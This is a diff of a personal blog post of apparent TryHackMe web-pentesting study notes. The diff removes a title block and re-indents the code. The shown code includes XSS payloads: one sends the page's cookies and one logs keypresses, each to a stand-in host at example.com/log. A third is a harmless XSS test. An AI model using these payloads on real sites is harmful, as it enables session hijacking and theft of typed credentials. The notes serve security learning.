@@ -6,11 +6,6 @@ original_link: https://cardboard-iguana.com/log/2022-03-19-tryhackme-jr-penetrat
 author: 100007
 ---
 
-# TryHackMe: Jr. Penetration Tester
-
-**author:** Nathan Acks  
-**date:** 2022-03-19
-
 As part of a job interview, I’ve been asked to run through an online CTF - the CMD+CTRL Cyber Range “LetSee Marketplace”. After reviewing the available information, I’m pretty sure I’m outclassed by this at my current skill level, but I plan to give it a shot anyway. It should be good learning/practice experience, and the worst that can happen is that I don’t get a second interview.
 
 To get my head back into the web hacking space (I’ve been focused more on studying for the Security+ certification recently, as I want to have that in the bag sometime around the end of April / beginning of May), I’m going to spend the day working on TryHackMe (specifically rooms focusing on website penetration testing).
@@ -79,10 +74,10 @@ Assuming you control the `example.com` domain, you can also log base64-encoded s
 
 ```
 <script>
-fetch('https://example.com/log'
-+ '?cookie='
-+ btoa(document.cookie)
-);
+	fetch('https://example.com/log'
+		+ '?cookie='
+		+ btoa(document.cookie)
+	);
 </script>
 ```
 
@@ -90,12 +85,12 @@ Simple keylogger (seems best to combine with cookie stealing, since otherwise it
 
 ```
 <script>
-document.onkeypress = function(e) {
-fetch('https://example.com/log'
-+ '?keypress='
-+ btoa(e.key)
-);
-}
+	document.onkeypress = function(e) {
+		fetch('https://example.com/log'
+			+ '?keypress='
+			+ btoa(e.key)
+		);
+	}
 </script>
 ```
 
@@ -135,8 +130,8 @@ A much less annoying XSS test than the typical `<alert/>` popup is to use someth
 
 ```
 <script>
-xssTest = document.querySelector("h1");
-xssTest.innerHTML = "XSS was here!";
+	xssTest = document.querySelector("h1");
+	xssTest.innerHTML = "XSS was here!";
 </script>
 ```
 
